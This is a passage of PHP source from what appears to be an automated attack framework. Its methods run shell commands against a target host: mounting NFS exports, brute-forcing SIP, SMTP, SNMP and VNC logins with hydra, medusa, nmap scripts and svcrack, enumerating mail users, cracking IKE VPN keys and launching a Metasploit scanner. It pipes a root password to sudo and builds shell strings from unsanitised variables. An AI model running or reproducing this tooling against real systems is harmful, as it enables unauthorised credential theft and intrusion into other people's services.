    if($this->service2nfs2check4mount($path_user))  {
        $uid_name = $this->service2nfs4mount2start($local_home_user);
        
        $this->key4add($this->stream8service,$local_home_user);
        $this->pause();
    }
    $this->pause();
    
    
    
    
    /*
     switch ($path_user) {
     case (strstr($path_user,"/root/")) :
     $root = TRUE;
     break ;
     
     case (strstr($path_user,"/home/")) :
     $find_user = trim($this->req_ret_str("echo '$path_user' | sed 's/\/home\///g' "));
     if (!empty($find_user)) {
     $this->yesUSERS($this->port2id, $find_user, "Enum via ".__FUNCTION__.": $path_user", "NFS PATH");
     $this->service2nfs4mount2home($path_user,$find_user, $uid_name, $local_home_user);
     }
     break;
     }
     */
    
    $query = "echo '$this->root_passwd' | sudo -S umount $local_home_user";
    $this->requette($query);
    return $result;
}


public function service2nfs4exec() {
    $result = "";
    $this->titre(__FUNCTION__);
    
    $query = "rpcinfo -p  $this->ip | grep nfs ";
    
    $this->req_ret_str($query);
    $query = "showmount --exports $this->ip 2>&1  | grep '/' ";
    $check = $this->req_ret_str($query);
    $path_user = "";
    
    if (!empty($check)) {
        //echo $this->rouge("1");
        $path_users = explode("\n", $check);
        foreach ($path_users as $path)
            if (!empty($path)) {
                $path_user = trim($this->req_ret_str("echo \"$path\" | cut -d' ' -f1 | cut -d\"*\" -f1 ")) ;
                $this->article("Path Mounted", $path_user) ;
                $this->pause();
                if(!empty($path_user)) $this->service2nfs4mount($path_user);
            }
    }
    
    return $result;
    
}







public function service2sip4exec(){
    $result = "";
    
    return "";
    $result .= $this->ssTitre(__FUNCTION__);
    
    $users_test = array("root","admin","administrator","guest","user","test","voip");
    foreach ($users_test as $user_test){
        $result .= $this->port2auth4dico4hydra("sip",$user_test);
    }
    
    
    $result .= $this->ssTitre("Fingerprinting SIP");
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"sip-brute,sip-enum-users,sip-methods\" --script-args 'sip-enum-users.padding=4, sip-enum-users.minext=100,sip-enum-users.maxext=9999' $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
    
    $query = "svmap $this->ip 2>/dev/null ";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->req_ret_str($query);
    
    $result .= $this->ssTitre("locate valid SIP extensions");
    $query = "svwar -m INVITE $this->ip -p $this->port -e 1-4000 2>/dev/null";
    $result .= $this->cmd("localhost",$query);
    $find_users = $this->req_ret_str($query);
    
    if (!empty($find_users)){
        $users = $this->req_ret_tab("echo '$find_users' | grep reqauth | grep -Po  \"[0-9]{1,}\"  ");
        $result .= $find_users;
        $result .= $this->ssTitre("CRACK the associated user's passwords");
        
        if (!empty($users))
            foreach ($users as $user2name)
            {
                $user2name = trim($user2name);
                $query = "svcrack -u $user2name -d $this->dico_password.1000 $this->ip -p $this->port -v 2>/dev/null | grep $user2name | sed 's/| $user2name//g' | sed 's/|//g' | tr -d \"[:space:]\" ";
                $result .= $this->cmd("localhost",$query);
                $pass_sip = $this->req_ret_str($query);
                $result .= $pass_sip;
                if (!empty($pass_sip)) {
                    $result .= $this->yesAUTH($this->ip, $this->port,$this->protocol,$user2name, $pass_sip,__FUNCTION__);
                    $result .= $this->cmd("localhost", "X-Lite <user id>:$user2name <secret>:$pass_sip <domain>:$this->ip");
                    //wget https://download.jitsi.org/jitsi/debian/jitsi_2.5-latest_amd64.deb
                    //dpkg -i jitsi_2.5-latest_amd64.deb
                }
            }
    }
    
    
    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
    $conn = $this->mysql_ressource->query($sql_r);
    while ($row = $conn->fetch_assoc()){
        $user2name = trim($row['user2name']);
        $user2pass = trim($row['user2pass']);
        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("sipt", $user2name, $user2pass);
    }
    
    
    return $result;
    
    
}




function service2smtp4exec(){
    // python -m smtpd -n -c DebuggingServer <ip>:<port>
    
    /*
     auxiliary/scanner/smtp/smtp_enum                                                          normal  Yes    SMTP User Enumeration Utility
     auxiliary/scanner/smtp/smtp_ntlm_domain                                                   normal  Yes    SMTP NTLM Domain Extraction
     auxiliary/scanner/smtp/smtp_relay                                                         normal  Yes    SMTP Open Relay Detection
     
     */
    $result = "";
    
    $result .= $this->ssTitre(__FUNCTION__);
    
    $test_fake = $this->req_ret_str("echo \"EHLO $this->ip\" | nc $this->ip $this->port -n -v -q 3 ");
    $this->article("Test Service", $test_fake);
    
    
    
    if (!$this->ip4priv($this->ip)){
        $date = date("h:i:sa");
        $smtp =<<<CODE
HELO localhost
MAIL FROM: $this->user2email
RCPT TO: $this->user2email
DATA
Subject: Pentest on this server By $this->user2agent
test $this->ip $date

$this->user2agent

\n
\n
.
QUIT
CODE;


$this->req_ret_str("echo '$smtp' | nc $this->ip $this->port -n -q 3");


$query = "swaks --to $this->user2email --from=$this->user2email --server $this->ip:$this->port --body \"test $this->ip $date\" --header \"Subject: test mail server by $this->user2agent\" -tls ";
$result .= $this->cmd("localhost", $query);
$result .= $this->req_ret_str($query);
    }
    
    
    //$result .= $this->service2smtp4nmap();
    
    
    
    $users_passwd = $this->ip2users4passwd();
    foreach ($users_passwd as $user2name => $user2pass){
        if (!empty($user2name)){
            $result .= $this->port2auth4pass4medusa("smtp", $user2name, $user2pass);
            $query = "swaks --to $this->user2email --from=$this->user2email --auth --auth-user=$user2name --auth-password=$user2pass --server $this->ip:$this->port --body \"test $this->ip $date\" --header \"Subject: test mail server by $this->user2agent\" -tls ";
            $result .= $this->cmd("localhost", $query);
            $result .= $this->req_ret_str($query);
        }
    }
    
    $tab_users_shell = $this->ip2users4shell();
    foreach ($tab_users_shell as $user2name_shell){
        $result .= $this->article("USER FOUND FOR TEST", $user2name_shell);
        $result .= $this->port2auth4pass4medusa("smtp", $user2name_shell, "password");
    }
    
    $this->pause();
    
    
    
    
    $query = "hydra -L $this->dico_users $this->ip smtp-enum -e nsr -t 8 -w 5s -s $this->port  2>/dev/null | grep -i  'login:' | cut -d':' -f3 ";
    //$result .= $this->cmd("localhost", $query); $result .= $this->auth2login4hydra($this->req_ret_str($query));
    
    return $result;
    
}


public function service2snmp4exec(){
    $result = "";
    /*
     auxiliary/scanner/snmp/snmp_enum                                                          normal  Yes    SNMP Enumeration Module
     auxiliary/scanner/snmp/snmp_enum_hp_laserjet                                              normal  Yes    HP LaserJet Printer SNMP Enumeration
     auxiliary/scanner/snmp/snmp_enumshares                                                    normal  Yes    SNMP Windows SMB Share Enumeration
     auxiliary/scanner/snmp/snmp_enumusers                                                     normal  Yes    SNMP Windows Username Enumeration
     auxiliary/scanner/snmp/snmp_login                                                         normal  Yes    SNMP Community Login Scanner
     
     */
    $result .= $this->ssTitre(__FUNCTION__);
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"snmp-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
    $result .= $this->cmd("localhost",$query); $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
    
    $query_hydra = "hydra -P \"$this->dico_users\" $this->ip snmp -f -t 12 -e nsr -s $this->port -w 5s 2>/dev/null  | grep $this->ip  | grep 'password:'   ";
    $result .= $this->cmd("localhost",$query_hydra);  $result .= $this->auth2login4hydra($this->req_ret_str($query_hydra));
    
    
    return $result;
}



public function service2vpn4exec(){
    $result = "";
    
    $result .= $this->ssTitre(__FUNCTION__);
    $query = "echo '$this->root_passwd' | sudo -S ike-scan -A -M  -P $this->dir_tmp/$this->ip.psk $this->ip";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->req_ret_str($query);
    
    $query = "psk-crack -d $this->dico_password $this->dir_tmp/$this->ip.psk | grep matches ";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->req_ret_str($query);
    
    $query = "patator ike_enum host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
    //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
    return $result;
}


public function service2vnc4exec(){
    $result = "";
    
    $result .= $this->ssTitre(__FUNCTION__);
    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"vnc-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
    $result .= $this->cmd("localhost",$query);
    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
    
    $query_hydra = "hydra -P \"$this->dico_password.1000\" $this->ip vnc -f -t 12 -e nsr -s $this->port -w 5s 2>/dev/null | grep $this->ip | grep 'password:'  ";
    $result .= $this->cmd("localhost",$query_hydra);
    $result .= $this->auth2login4hydra($this->req_ret_str($query_hydra));
    
    $users_test = array("root","admin","administrator","guest","user","test");
    foreach ($users_test as $user_test){
        $result .= $this->port2auth4dico4medusa("vnc",$user_test);
        $query = "patator vnc_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
        //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
        
    }
    
    return $result;
    
}

public function service2vnc2msf(){
    $this->ssTitre(__FUNCTION__);
    $query = "echo \"db_status\nuse auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS $this->ip\nset RPORT $this->port\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
    return $this->req_ret_str($query);
}




function service2ssl4check2poodle(){
    $this->ssTitre(__FUNCTION__);
    $this->service2ssl3();
    $this->service2ssl4check2sslv3();
}

function service2ssl4check2all(){
    $this->ssTitre(__FUNCTION__);
    $this->net("https://cryptoreport.websecurity.symantec.com/checker/views/certCheck.jsp");
}

function service2ssl4exec(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $https = "";
    
    
    
    $query = "sslscan $this->ip:$this->port | grep 'Accepted'   ";
    $https .= $this->req_ret_str($query);
    $https .= $this->service2ssl4check2poodle()."\n";
    $https .= $this->service2tls1()."\n";
    //$https .= $this->service2ssl4check2crime()."\n";
    $https .= $this->service2ssl4check2pubkey()."\n";
    $https .= $this->service2ssl4check2sslv2()."\n";
    //$https .= $this->service2ssl4check2sslyze()."\n";
    $https .= $this->service2ssl4chiper2null()."\n";
    $https .= $this->service2ssl4chiper2test()."\n";
    
    //$https .= $this->service2ssl2enum()."\n";
    return $https;
    
}





public function service2smtp2users(){
    $this->ssTitre(__FUNCTION__);
    $query = "perl $this->dir_tools/smtp-user-enum.pl -t $this->ip -p $this->port -M VRFY -U $this->dico_users | grep 'exists'  | sed  \"s/ exists//g\" | cut -d':' -f2 ";
    $users = $this->req_ret_str($query);
    if(!empty(trim($users))) {
        $users_tab = explode("\n", $users);
        foreach ($users_tab as $user2name) if (!empty($user2name)) $this->yesUSERS($this->port2id, $user2name, "smtp-user-enum -M VRFY","");
    }
    
    $query = "perl $this->dir_tools/smtp-user-enum.pl -t $this->ip -p $this->port -M EXPN -U $this->dico_users | grep 'exists'  | sed  \"s/ exists//g\" | cut -d':' -f2 ";
    $users = $this->req_ret_str($query);
    if(!empty(trim($users))) {
        $users_tab = explode("\n", $users);
        foreach ($users_tab as $user2name) $this->yesUSERS($this->port2id, $user2name, "smtp-user-enum -M EXPN","");
    }
    
    $query = "perl $this->dir_tools/smtp-user-enum.pl -t $this->ip -p $this->port -M RCPT -U $this->dico_users | grep 'exists'  | sed  \"s/ exists//g\" | cut -d':' -f2 ";
    
    $users = $this->req_ret_str($query);
    if(!empty(trim($users))) {
        $users_tab = explode("\n", $users);
        foreach ($users_tab as $user2name) $this->yesUSERS($this->port2id, $user2name, "smtp-user-enum -M RCPT","");
    }
}




function service2smtp4nmap(){
    $this->ssTitre(__FUNCTION__);
    $query = "echo '$this->root_passwd' | sudo -S nmap  --script \"smtp-commands,smtp-enum-users,smtp-brute,smtp-vuln-*\" --script-args \"smtp-enum-users.methods={EXPN,RCPT,VRFY},smtp-brute.userdb=$this->dico_users,smtp-brute.passdb=$this->dico_password.1000\"  -s$this->protocol -p $this->port -e $this->eth $this->ip -Pn  -oX -  ";
    return $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
}
























  }
?>
